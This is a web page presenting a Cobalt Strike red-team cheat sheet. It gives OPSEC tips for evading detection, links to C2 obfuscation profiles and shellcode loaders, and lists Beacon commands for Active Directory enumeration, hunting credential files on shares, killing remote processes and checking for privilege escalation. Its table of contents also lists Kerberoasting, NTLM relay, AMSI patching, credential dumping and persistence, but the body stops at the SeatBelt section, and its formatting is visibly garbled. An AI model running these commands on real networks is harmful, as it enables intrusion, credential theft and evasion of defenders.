<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Cobaltstrike red team - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Cobalt Strike Red Team Cheat Sheet", url: "#_top", children: [
          ]},
          {title: "### Overview", url: "#overview", children: [
          ]},
          {title: "### ### ### Important OPSEC notes...", url: "#important-opsec-notes", children: [
          ]},
          {title: "### Malleable C2 Profiles", url: "#malleable-c2-profiles", children: [
          ]},
          {title: "### Reflective Shellcode Loaders", url: "#reflective-shellcode-loaders", children: [
          ]},
          {title: "### Domain Enumeration", url: "#domain-enumeration", children: [
          ]},
          {title: "PowerView:", url: "#powerview", children: [
          ]},
          {title: "SharpView", url: "#sharpview", children: [
          ]},
          {title: "Running SharpView in memory (.NET version of PowerView)", url: "#running-sharpview-in-memory-net-version-of-powerview", children: [
          ]},
          {title: "Collecting only user sessions to determine who is logged in and where:", url: "#collecting-only-user-sessions-to-determine-who-is-logged-in-and-where", children: [
          ]},
          {title: "Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html", url: "#collection-methods-reference-httpsbloodhoundreadthedocsioenlatestdata-collectionsharphound-all-flagshtml", children: [
          ]},
          {title: "Get all domain controllers of a domain", url: "#get-all-domain-controllers-of-a-domain", children: [
          ]},
          {title: "Get domain trusts", url: "#get-domain-trusts", children: [
          ]},
          {title: "### ### Domain SMB Share Enumeration", url: "#domain-smb-share-enumeration", children: [
          ]},
          {title: "Find all domain shares that the current user has access to", url: "#find-all-domain-shares-that-the-current-user-has-access-to", children: [
          ]},
          {title: "Find interesting domain share files", url: "#find-interesting-domain-share-files", children: [
          ]},
          {title: "Find all accessible network shares in a domain, exclude default share names (SYSVOL,netlogon,ipc$,print$), and perform read/write access checks", url: "#find-all-accessible-network-shares-in-a-domain-exclude-default-share-names-sysvolnetlogonipcprint-and-perform-readwrite-access-checks", children: [
          ]},
          {title: "Find all server shares (including DCs), exclude default share names, perform read/write access checks and output to file", url: "#find-all-server-shares-including-dcs-exclude-default-share-names-perform-readwrite-access-checks-and-output-to-file", children: [
          ]},
          {title: "Run Snaffler on all domain systems found, output to console and file", url: "#run-snaffler-on-all-domain-systems-found-output-to-console-and-file", children: [
          ]},
          {title: "Run Snaffler on only target hosts", url: "#run-snaffler-on-only-target-hosts", children: [
          ]},
          {title: "### ### Miscellaneous Remote Workstation/Server stuff", url: "#miscellaneous-remote-workstationserver-stuff", children: [
          ]},
          {title: "### Local Privilege Escalation", url: "#local-privilege-escalation", children: [
          ]},
          {title: "### ### PowerUp - PowerSploit module", url: "#powerup-powersploit-module", children: [
          ]},
          {title: "### ### SharpUp - .NET port of PowerUp", url: "#sharpup-net-port-of-powerup", children: [
          ]},
          {title: "Run all checks automatically - output to console", url: "#run-all-checks-automatically-output-to-console", children: [
          ]},
          {title: "Run an individual check", url: "#run-an-individual-check", children: [
          ]},
          {title: "### ### WinPEAS - Windows Privilege Escalation Awesome Script", url: "#winpeas-windows-privilege-escalation-awesome-script", children: [
          ]},
          {title: "Run only user-related checks - returns things like Chrome data, DPAPI keys, IE tabs, Windows vault/credentials, etc.", url: "#run-only-user-related-checks-returns-things-like-chrome-data-dpapi-keys-ie-tabs-windows-vaultcredentials-etc", children: [
          ]},
          {title: "Password spraying", url: "#password-spraying", children: [
          ]},
          {title: "Get the full domain user list (Optional)", url: "#get-the-full-domain-user-list-optional", children: [
          ]},
          {title: "Password spray from a username and password list", url: "#password-spray-from-a-username-and-password-list", children: [
          ]},
          {title: "Auto spray a specific password on an auto-generated user list (very noisy)", url: "#auto-spray-a-specific-password-on-an-auto-generated-user-list-very-noisy", children: [
          ]},
          {title: "By default it will automatically generate a user list from the domain using LDAP", url: "#by-default-it-will-automatically-generate-a-user-list-from-the-domain-using-ldap", children: [
          ]},
          {title: "Sleeps 30 minutes between each password cycle, delays 300 milliseconds between each password guess attempt", url: "#sleeps-30-minutes-between-each-password-cycle-delays-300-milliseconds-between-each-password-guess-attempt", children: [
          ]},
          {title: "Kerberoasting", url: "#kerberoasting", children: [
          ]},
          {title: "Get users with SPN set", url: "#get-users-with-spn-set", children: [
          ]},
          {title: "Kerberoast all users", url: "#kerberoast-all-users", children: [
          ]},
          {title: "Kerberoast specific user", url: "#kerberoast-specific-user", children: [
          ]},
          {title: "Kerberoast all users", url: "#kerberoast-all-users_1", children: [
          ]},
          {title: "Kerberoast specific user", url: "#kerberoast-specific-user_1", children: [
          ]},
          {title: "### ### AS-REP Roasting", url: "#as-rep-roasting", children: [
          ]},
          {title: "AS-REP roast all users with Rubeus", url: "#as-rep-roast-all-users-with-rubeus", children: [
          ]},
          {title: "AS-REP roast specific user with Rubeus", url: "#as-rep-roast-specific-user-with-rubeus", children: [
          ]},
          {title: "Coercion attacks", url: "#coercion-attacks", children: [
          ]},
          {title: "PetitPotam - NTLM relay to AD CS", url: "#petitpotam-ntlm-relay-to-ad-cs", children: [
          ]},
          {title: "Find AD CS web server and verify if web enrollment is enabled by browsing to the URL: http://ADCS-server.domain.com/certsrv/", url: "#find-ad-cs-web-server-and-verify-if-web-enrollment-is-enabled-by-browsing-to-the-url-httpadcs-serverdomaincomcertsrv", children: [
          ]},
          {title: "Start NTLM relay server on Kali", url: "#start-ntlm-relay-server-on-kali", children: [
          ]},
          {title: "Force coercion via PetitPotam in Cobalt Strike Beacon - Observe \"Attack Success!!!\" in output if it worked", url: "#force-coercion-via-petitpotam-in-cobalt-strike-beacon-observe-attack-success-in-output-if-it-worked", children: [
          ]},
          {title: "NTLM relay output will have base64 ticket of target DC machine account", url: "#ntlm-relay-output-will-have-base64-ticket-of-target-dc-machine-account", children: [
          ]},
          {title: "Use Rubeus to request TGT of DC machine account to esclate to Domain Admin", url: "#use-rubeus-to-request-tgt-of-dc-machine-account-to-esclate-to-domain-admin", children: [
          ]},
          {title: "Verify asktgt command worked by doing an \u0027ls\u0027 command on the DC", url: "#verify-asktgt-command-worked-by-doing-an-ls-command-on-the-dc", children: [
          ]},
          {title: "Defense Evasion", url: "#defense-evasion", children: [
          ]},
          {title: "Shellcode injection techniques", url: "#shellcode-injection-techniques", children: [
          ]},
          {title: "Spawn a beacon into an existing process", url: "#spawn-a-beacon-into-an-existing-process", children: [
          ]},
          {title: "Inject raw shellcode into an existing process", url: "#inject-raw-shellcode-into-an-existing-process", children: [
          ]},
          {title: "Create shellcode: Cobbalt Strike --\u0026gt; Attacks --\u0026gt; Packages --\u0026gt; Windows Executable (S) --\u0026gt; Output = Raw --\u0026gt; Creates \"beacon.bin\" file", url: "#create-shellcode-cobbalt-strike-attacks-packages-windows-executable-s-output-raw-creates-beaconbin-file", children: [
          ]},
          {title: "Shellcode injection methods using Windows syscalls with BOFs script", url: "#shellcode-injection-methods-using-windows-syscalls-with-bofs-script", children: [
          ]},
          {title: "AMSI patch", url: "#amsi-patch", children: [
          ]},
          {title: "ETW patch", url: "#etw-patch", children: [
          ]},
          {title: "API Unhooking", url: "#api-unhooking", children: [
          ]},
          {title: "Exploitation", url: "#exploitation", children: [
          ]},
          {title: "DPAPI decryption and extraction on Windows systems", url: "#dpapi-decryption-and-extraction-on-windows-systems", children: [
          ]},
          {title: "SharpDPAPI to retrieve domain DPAPI backup key and output to file which is used for subsequent attacks (requires DA privileges)", url: "#sharpdpapi-to-retrieve-domain-dpapi-backup-key-and-output-to-file-which-is-used-for-subsequent-attacks-requires-da-privileges", children: [
          ]},
          {title: "Decrypt any RDG (remote desktop) passwords found using the domain backup key (can also use local Admin account or master key)", url: "#decrypt-any-rdg-remote-desktop-passwords-found-using-the-domain-backup-key-can-also-use-local-admin-account-or-master-key", children: [
          ]},
          {title: "Decrypt any KeePass passwords found using the domain backup key (can also use local Admin account or master key)", url: "#decrypt-any-keepass-passwords-found-using-the-domain-backup-key-can-also-use-local-admin-account-or-master-key", children: [
          ]},
          {title: "Dump Chrome logins on the local system for the current user", url: "#dump-chrome-logins-on-the-local-system-for-the-current-user", children: [
          ]},
          {title: "Dump Chrome cookies on the local system for the current user", url: "#dump-chrome-cookies-on-the-local-system-for-the-current-user", children: [
          ]},
          {title: "Dump Chrome cookies on the local system only for a specific URL - Output in JSON format to import into \"Cookie Editor\" browser extension", url: "#dump-chrome-cookies-on-the-local-system-only-for-a-specific-url-output-in-json-format-to-import-into-cookie-editor-browser-extension", children: [
          ]},
          {title: "Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)", url: "#dumping-chrome-login-passwords-on-remote-machines-using-the-domain-backup-key-can-also-use-local-user-password", children: [
          ]},
          {title: "Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)", url: "#dumping-and-decryptiong-chrome-user-cookies-and-sessions-on-remote-machines-using-the-domain-backup-key-can-also-use-local-user-password", children: [
          ]},
          {title: "Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor", url: "#cookies-can-then-be-imported-into-chromefirefox-using-the-extension-cookie-editor", children: [
          ]},
          {title: "SharpWeb - Retrieve saved credentials in Chrome, Firefox and Edge", url: "#sharpweb-retrieve-saved-credentials-in-chrome-firefox-and-edge", children: [
          ]},
          {title: "Find vulnerable certificates with Certify.exe", url: "#find-vulnerable-certificates-with-certifyexe", children: [
          ]},
          {title: "Request a new certificate for a vulnerable template from the above output", url: "#request-a-new-certificate-for-a-vulnerable-template-from-the-above-output", children: [
          ]},
          {title: "Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus", url: "#copy-the-certificate-private-key-from-the-above-output-to-a-file-then-request-a-tgt-using-the-certificate-file-with-rubeus", children: [
          ]},
          {title: "First, start a SOCKS proxy in Cobalt Strike (or skip to the next step if you have an on-site Linux VM)", url: "#first-start-a-socks-proxy-in-cobalt-strike-or-skip-to-the-next-step-if-you-have-an-on-site-linux-vm", children: [
          ]},
          {title: "Configure proxychains on Kali/Linux VM to proxy traffic through C2", url: "#configure-proxychains-on-kalilinux-vm-to-proxy-traffic-through-c2", children: [
          ]},
          {title: "Find vulnerable certs with Certipy through proxy", url: "#find-vulnerable-certs-with-certipy-through-proxy", children: [
          ]},
          {title: "Request a certificate for a vulnerable cert template through proxy", url: "#request-a-certificate-for-a-vulnerable-cert-template-through-proxy", children: [
          ]},
          {title: "Authenticate with the output .PFX cert file to reequset a TGT for the DomainAdminAcc user", url: "#authenticate-with-the-output-pfx-cert-file-to-reequset-a-tgt-for-the-domainadminacc-user", children: [
          ]},
          {title: "Use the output certificate of the DomainAdminAcc account with Rubeus", url: "#use-the-output-certificate-of-the-domainadminacc-account-with-rubeus", children: [
          ]},
          {title: "MalSCCM - Exploiting SCCM servers to deploy malicious applications", url: "#malsccm-exploiting-sccm-servers-to-deploy-malicious-applications", children: [
          ]},
          {title: "Find the SCCM management servers", url: "#find-the-sccm-management-servers", children: [
          ]},
          {title: "Check if the current host is an SCCM client", url: "#check-if-the-current-host-is-an-sccm-client", children: [
          ]},
          {title: "Gather all info from SCCM including users, groups, forest, application, deployments", url: "#gather-all-info-from-sccm-including-users-groups-forest-application-deployments", children: [
          ]},
          {title: "You can use MalSCCM to deploy a malicious application to a target group then force the users to check-in and run your payload", url: "#you-can-use-malsccm-to-deploy-a-malicious-application-to-a-target-group-then-force-the-users-to-check-in-and-run-your-payload", children: [
          ]},
          {title: "This is explained in MUCH more details in the walkthrough here: https://labs.nettitude.com/blog/introducing-malsccm/", url: "#this-is-explained-in-much-more-details-in-the-walkthrough-here-httpslabsnettitudecomblogintroducing-malsccm", children: [
          ]},
          {title: "Exfiltration - Password Attacks", url: "#exfiltration-password-attacks", children: [
          ]},
          {title: "Dumping LSASS locally (all commands below require local Admin)", url: "#dumping-lsass-locally-all-commands-below-require-local-admin", children: [
          ]},
          {title: "Works against most updated systems with AV/EDR if running as SYSTEM", url: "#works-against-most-updated-systems-with-avedr-if-running-as-system", children: [
          ]},
          {title: "SAM database dump", url: "#sam-database-dump", children: [
          ]},
          {title: "Download SAM files then dump hahses offline using Secretsdump.py", url: "#download-sam-files-then-dump-hahses-offline-using-secretsdumppy", children: [
          ]},
          {title: "SharpSecDump SAM and LSA extraction", url: "#sharpsecdump-sam-and-lsa-extraction", children: [
          ]},
          {title: "Runs in the context of the current user", url: "#runs-in-the-context-of-the-current-user", children: [
          ]},
          {title: "Local Admin privileges is required on the target machine", url: "#local-admin-privileges-is-required-on-the-target-machine", children: [
          ]},
          {title: "### ### NTDS.dit dump (all commands below require Domain Admin privileges!)", url: "#ntdsdit-dump-all-commands-below-require-domain-admin-privileges", children: [
          ]},
          {title: "Perform DC Sync hash dump for all users in the target domain", url: "#perform-dc-sync-hash-dump-for-all-users-in-the-target-domain", children: [
          ]},
          {title: "Perform DC Sync hash dump for all users in the specified group", url: "#perform-dc-sync-hash-dump-for-all-users-in-the-specified-group", children: [
          ]},
          {title: "Credential Prompt", url: "#credential-prompt", children: [
          ]},
          {title: "Exfiltration - Email", url: "#exfiltration-email", children: [
          ]},
          {title: "MailSniper", url: "#mailsniper", children: [
          ]},
          {title: "Search all mailboxes in a domain - Looks for \"password\",\"creds\",\"credentials\"", url: "#search-all-mailboxes-in-a-domain-looks-for-passwordcredscredentials", children: [
          ]},
          {title: "Search the current users mailbox", url: "#search-the-current-users-mailbox", children: [
          ]},
          {title: "Get the Global Address List (GAL)", url: "#get-the-global-address-list-gal", children: [
          ]},
          {title: "powershell Get-GlobalAddressList -ExchHostname ExchangeHost.domain.com -UserName domain\\username -Password P@ssw0rd! -OutFile gal.txt", url: "#powershell-get-globaladdresslist-exchhostname-exchangehostdomaincom-username-domainusername-password-pssw0rd-outfile-galtxt", children: [
              {title: "Persistence", url: "#persistence" },
              {title: "Scheduled task persistence", url: "#scheduled-task-persistence" },
              {title: "Service creation persistence", url: "#service-creation-persistence" },
              {title: "User registry key persistence", url: "#user-registry-key-persistence" },
              {title: "Many other methods available on the tool\u0027s github documentation", url: "#many-other-methods-available-on-the-tools-github-documentation" },
              {title: "List persistence entries", url: "#list-persistence-entries" },
              {title: "Registy persistence", url: "#registy-persistence" },
              {title: "Scheduled task backdoor persistence", url: "#scheduled-task-backdoor-persistence" },
              {title: "Startup folder persistence", url: "#startup-folder-persistence" },
              {title: "Windows service persistence", url: "#windows-service-persistence" },
              {title: "Cobalt Strike BOFs", url: "#cobalt-strike-bofs" },
              {title: "BOF.NET", url: "#bofnet" },
              {title: "References", url: "#references" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../methods/external/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../methods/external/" class="btn btn-xs btn-link">
        External
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../../web/wordlists/s0md3v_XSS.txt" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../../web/wordlists/s0md3v_XSS.txt" class="btn btn-xs btn-link">
        s0md3v_XSS
      </a>
    </div>
    
  </div>

    

    <h3 id="cobalt-strike-red-team-cheat-sheet">Cobalt Strike Red Team Cheat Sheet</h3>
<h3 id="overview">###  Overview</h3>
<ul>
<li><a href="### malleable-c2-profiles">Malleable C2 Profiles</a></li>
<li><a href="### reflective-shellcode-loaders">Reflective Shellcode Loaders</a></li>
<li><a href="### domain-enumeration">Domain Enumeration</a></li>
<li><a href="### local-privilege-escalation">Local Privilege Escalation</a></li>
<li><a href="### lateral-movement">Lateral Movement</a></li>
<li><a href="### domain-privilege-escalation">Domain Privilege Escalation</a></li>
<li><a href="### defense-evasion">Defense Evasion</a></li>
<li><a href="### exploitation">Exploitation</a></li>
<li><a href="### exfiltration---password-attacks">Exfiltration - Password Attacks</a></li>
<li><a href="### exfiltration---email">Exfiltration - Email</a></li>
<li><a href="### persistence">Persistence</a></li>
<li><a href="### cobalt-strike-bofs">Cobalt Strike BOFs</a></li>
<li><a href="### references">References</a></li>
</ul>
<hr />
<h3 id="important-opsec-notes">### ### ###  Important OPSEC notes...</h3>
<p>For an actual red team, do NOT use <code>execute-assembly</code> at all, ever! Instead, sub the command for <a href="https://github.com/CCob/BOF.NET/pull/1">BOF.NET</a> <code>bofnet_executeassembly</code> or another .NET assembly loader BOF (i.e. <a href="https://github.com/anthemtotheego/InlineExecute-Assembly">InlineExecute-Assembly</a>).<br />
For everything else, use BOFs instead of <code>run</code> or <code>shell</code> commands for best OPSEC. (<a href="https://github.com/wsummerhill/C2_RedTeam_CheatSheets/blob/main/CobaltStrike/BOF_Collections.md">BOF cheat sheet here</a>).</p>
<hr />
<h3 id="malleable-c2-profiles">###  Malleable C2 Profiles</h3>
<p>A collection of tools used to generate new malleable C2 profiles to use with Cobalt Strike and better obfuscate your traffic/commands.</p>
<ul>
<li><a href="https://github.com/threatexpress/random_c2_profile">Random C2 Profile</a></li>
<li><a href="https://github.com/threatexpress/malleable-c2">Malleable C2</a></li>
<li><a href="https://github.com/xx0hcd/Malleable-C2-Profiles">Malleable C2 Profiles</a></li>
<li><a href="https://github.com/FortyNorthSecurity/C2concealer">C2concealer</a></li>
<li><a href="https://github.com/Tylous/SourcePoint">SourcePoint</a></li>
</ul>
<hr />
<h3 id="reflective-shellcode-loaders">###  Reflective Shellcode Loaders</h3>
<p>Shellcode loaders to add in Cobalt Strike before generating your shellcode which are used to reflectively generate shellcode for added obfuscation, encryption, and ultimately better evasion. </p>
<ul>
<li><a href="https://github.com/kyleavery/AceLdr">AceLdr</a></li>
<li><a href="https://github.com/benheise/TitanLdr">TitanLdr</a></li>
<li><a href="https://github.com/boku7/BokuLoader">BokuLoader</a> - Bobby Cooke's reflective loader</li>
</ul>
<hr />
<h3 id="domain-enumeration">###  Domain Enumeration</h3>
<p>Running PowerView and SharpView</p>
<h3 id="powerview">PowerView:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>powershell-import --&gt; Select PowerView.ps1 to import PS1 file in memory
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>powershell Get-Module PowerView
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>powershell Get-NetUser -Identity testuser -Domain lab.com
</span></code></pre></div>
<h3 id="sharpview">SharpView</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --&gt; Check servers for local admin using current privileges
</span></code></pre></div>
<p>Running Sharphound (.NET version of Bloodhound) for AD domain collection</p>
<h3 id="running-sharpview-in-memory-net-version-of-powerview">Running SharpView in memory (.NET version of PowerView)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\
</span></code></pre></div>
<h3 id="collecting-only-user-sessions-to-determine-who-is-logged-in-and-where">Collecting only user sessions to determine who is logged in and where:</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\
</span></code></pre></div>
<h3 id="collection-methods-reference-httpsbloodhoundreadthedocsioenlatestdata-collectionsharphound-all-flagshtml">Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html</h3>
<p><a href="https://github.com/adrecon/ADRecon">AD Recon tool</a> - Perform different collection methods (ACLs, OUs, DCs, etc.) and output to Excel files
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>powershell-import --&gt; ADRecon.ps1
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>###  Perform all collection methods:
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>powershell ADRecon -OutputDir .\ -DomainController ops-dc.lab.com
</span></code></pre></div></p>
<p>Get domain trusts and domain controllers with built-in <code>nltest.exe</code> utility</p>
<h3 id="get-all-domain-controllers-of-a-domain">Get all domain controllers of a domain</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>run nltest /dclist:domain.com
</span></code></pre></div>
<h3 id="get-domain-trusts">Get domain trusts</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>run nltest /trusted_domains
</span></code></pre></div>
<h3 id="domain-smb-share-enumeration">### ###  Domain SMB Share Enumeration <br></h3>
<p><a href="https://powersploit.readthedocs.io/en/latest">PowerView</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>powershell-import --&gt; Select PowerView.ps1 to import PS1 file in memory
</span></code></pre></div></p>
<h3 id="find-all-domain-shares-that-the-current-user-has-access-to">Find all domain shares that the current user has access to</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>powershell Find-DomainShare -CheckShareAccess
</span></code></pre></div>
<h3 id="find-interesting-domain-share-files">Find interesting domain share files</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>powershell Find-InterestingDomainShareFile -ComputerDomain DOMAIN.COM
</span></code></pre></div>
<p><a href="https://github.com/mitchmoser/SharpShares">SharpShares</a> - List accessible shares on remote systems and check read/write privileges<br></p>
<h3 id="find-all-accessible-network-shares-in-a-domain-exclude-default-share-names-sysvolnetlogonipcprint-and-perform-readwrite-access-checks">Find all accessible network shares in a domain, exclude default share names (SYSVOL,netlogon,ipc$,print$), and perform read/write access checks</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>execute-assembly C:\SharpShares.exe /ldap:all /filter
</span></code></pre></div>
<h3 id="find-all-server-shares-including-dcs-exclude-default-share-names-perform-readwrite-access-checks-and-output-to-file">Find all server shares (including DCs), exclude default share names, perform read/write access checks and output to file</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>execute-assembly C:\SharpShares.exe /ldap:servers /filter /outfile:find-domain-shares.txt
</span></code></pre></div>
<p><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a> - Automated network share enumeration to look for interesting files/creds</p>
<h3 id="run-snaffler-on-all-domain-systems-found-output-to-console-and-file">Run Snaffler on all domain systems found, output to console and file</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>execute-assembly C:\snaffler.exe -d DOMAN.COM -s -o C:\temp\snaffler.log
</span></code></pre></div>
<h3 id="run-snaffler-on-only-target-hosts">Run Snaffler on only target hosts</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>execute-assembly C:\snaffler.exe -s -o C:\temp\snaffler2.log -n hostname1.domain.com,hostname2.domain.com,hostname3.domain.com
</span></code></pre></div>
<h3 id="miscellaneous-remote-workstationserver-stuff">### ###  Miscellaneous Remote Workstation/Server stuff</h3>
<p>List and kill processes on remote system (requires local Admin)
- Using tasklist.exe and taskkill.exe <br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>run tasklist /s SERVER.domain.com --&gt; List remote processes
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>run taskkill /s SERVER.domain.com /IM PROCESS.exe --&gt; Kill remote process
</span></code></pre></div>
- Using <a href="https://github.com/FortyNorthSecurity/CIMplant">CIMplant</a> <br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>execute-assembly CIMplant.exe -s [remote-IP-address] -c ps --&gt; List remote processes
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>execute-assembly CIMplant.exe -s [remote-IP-address] -c process_kill &lt;ProcessName/PID&gt; --&gt; Kill remote process
</span></code></pre></div></p>
<hr />
<h3 id="local-privilege-escalation">###  Local Privilege Escalation</h3>
<h3 id="powerup-powersploit-module">### ###  <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">PowerUp</a> - PowerSploit module</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>powershell-import --&gt; PowerUp.ps1
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>powerpick Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
</span></code></pre></div>
<h3 id="sharpup-net-port-of-powerup">### ###  <a href="https://github.com/GhostPack/SharpUp">SharpUp</a> - .NET port of PowerUp</h3>
<h3 id="run-all-checks-automatically-output-to-console">Run all checks automatically - output to console</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>execute-assembly C:\SharpUp.exe audit
</span></code></pre></div>
<h3 id="run-an-individual-check">Run an individual check</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>execute-assembly SharpUp.exe HijackablePaths 
</span></code></pre></div>
<h3 id="winpeas-windows-privilege-escalation-awesome-script">### ###  <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe">WinPEAS</a> - Windows Privilege Escalation Awesome Script<br></h3>
<p>```execute-assembly winpeas.exe ### run all checks
<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>&lt;br&gt;
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>### ### ###  [SeatBelt](https://github.com/GhostPack/Seatbelt) - .NET tool by GhostPack  
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>GREAT tool to query a local system to gather system/user/remote/misc data
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>Can be used as Admin or normal-privileged user  
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>###  Run ALL checks - returns TONS of data
</span></code></pre></div>
execute-assembly C:\SeatBelt.exe -group=all -full -outputfile="C:\Temp\SeatBelt-all.json"</p>
<h3 id="run-only-user-related-checks-returns-things-like-chrome-data-dpapi-keys-ie-tabs-windows-vaultcredentials-etc">Run only user-related checks - returns things like Chrome data, DPAPI keys, IE tabs, Windows vault/credentials, etc.</h3>
<p>execute-assembly C:\SeatBelt.exe -group=user -outputfile="C:\Temp\SeatBelt-user.json"
<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>###  Run only system-related checks - returns things like Antivirus, Applocker, env path/variables, local users/groups, WMI, sysmon, UAC, etc.
</span></code></pre></div>
